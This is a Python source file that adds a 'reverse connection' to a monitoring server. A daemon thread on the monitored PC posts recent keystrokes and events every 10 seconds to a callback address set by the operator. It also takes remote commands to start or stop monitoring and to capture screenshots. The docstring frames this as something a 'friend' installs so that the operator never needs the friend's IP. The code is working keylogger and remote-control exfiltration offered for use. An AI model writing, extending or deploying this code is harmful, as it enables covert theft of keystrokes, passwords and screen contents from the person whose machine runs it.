"""
Reverse Connection Server - Server connects TO the client
Add this to your server.py or run it separately

The server will periodically try to connect to your static IP
and send data to you, so you don't need to know his IP!
"""

import requests
import json
import time
import threading
from datetime import datetime
from pathlib import Path

# Configuration - Your friend sets this to YOUR static IP
CALLBACK_CONFIG = {
    "enabled": True,
    "callback_url": "http://YOUR_STATIC_IP:8080",  # Your client listener
    "callback_key": "your_shared_secret_key",
    "interval": 10,  # Send data every 10 seconds
    "retry_interval": 30  # If connection fails, retry every 30 seconds
}


class ReverseConnection:
    """Handles reverse connection - server pushes data to client"""
    
    def __init__(self, config):
        self.callback_url = config.get('callback_url')
        self.callback_key = config.get('callback_key')
        self.interval = config.get('interval', 10)
        self.retry_interval = config.get('retry_interval', 30)
        self.enabled = config.get('enabled', False)
        self.running = True
        self.connected = False
        
    def start(self):
        """Start the reverse connection thread"""
        if not self.enabled:
            print("Reverse connection disabled")
            return
        
        thread = threading.Thread(target=self._callback_loop, daemon=True)
        thread.start()
        print(f"Reverse connection enabled - connecting to {self.callback_url}")
    
    def _callback_loop(self):
        """Main loop that sends data back to client"""
        while self.running:
            try:
                # Get current server status
                data = self._collect_data()
                
                # Send to your client
                response = requests.post(
                    f"{self.callback_url}/callback",
                    json=data,
                    headers={'X-Callback-Key': self.callback_key},
                    timeout=5
                )
                
                if response.status_code == 200:
                    if not self.connected:
                        print(f"✓ Connected to client at {self.callback_url}")
                        self.connected = True
                    
                    # Check if client sent commands
                    result = response.json()
                    if result.get('command'):
                        self._handle_command(result['command'])
                    
                    time.sleep(self.interval)
                else:
                    raise Exception(f"Bad response: {response.status_code}")
                    
            except Exception as e:
                if self.connected:
                    print(f"✗ Lost connection to client: {e}")
                    self.connected = False
                
                # Retry after delay
                time.sleep(self.retry_interval)
    
    def _collect_data(self):
        """Collect data to send to client"""
        from server import events, keystroke_buffer, monitoring, pc_id, config
        
        # Get recent events (last 50)
        recent_events = events[-50:] if len(events) > 0 else []
        
        # Get recent keystrokes
        recent_keystrokes = keystroke_buffer[-100:] if len(keystroke_buffer) > 0 else []
        
        return {
            "timestamp": datetime.now().isoformat(),
            "pc_id": pc_id,
            "pc_name": config.get('pc_name', 'Unknown'),
            "monitoring": monitoring,
            "event_count": len(events),
            "keystroke_count": len(keystroke_buffer),
            "events": recent_events,
            "keystrokes": recent_keystrokes
        }
    
    def _handle_command(self, command):
        """Handle commands from client"""
        from server import start_monitoring, stop_monitoring, take_screenshot
        
        cmd_type = command.get('type')
        
        print(f"Received command: {cmd_type}")
        
        if cmd_type == 'start':
            start_monitoring()
        elif cmd_type == 'stop':
            stop_monitoring()
        elif cmd_type == 'snapshot':
            take_screenshot()
        elif cmd_type == 'ping':
            pass  # Just acknowledge
    
    def stop(self):
        """Stop the reverse connection"""
        self.running = False


# ============================================================================
# Add this to your server.py at the bottom (before if __name__)
# ============================================================================

def load_callback_config():
    """Load callback configuration"""
    callback_file = Path("callback_config.json")
    
    if callback_file.exists():
        try:
            with open(callback_file, 'r') as f:
                return json.load(f)
        except:
            pass
    
    # Create default config
    default_config = {
        "enabled": False,
        "callback_url": "http://YOUR_CLIENT_IP:8080",
        "callback_key": "change_this_secret_key",
        "interval": 10,
        "retry_interval": 30
    }
    
    with open(callback_file, 'w') as f:
        json.dump(default_config, f, indent=4)
    
    print(f"\nCreated callback_config.json - Edit it with your client's IP!")
    
    return default_config


# ============================================================================
# Modify the if __name__ == '__main__' section in server.py to add:
# ============================================================================

if __name__ == '__main__':
    # ... existing startup code ...
    
    # Start reverse connection if configured
    callback_config = load_callback_config()
    if callback_config.get('enabled'):
        reverse_conn = ReverseConnection(callback_config)
        reverse_conn.start()
    
    # ... rest of startup code ...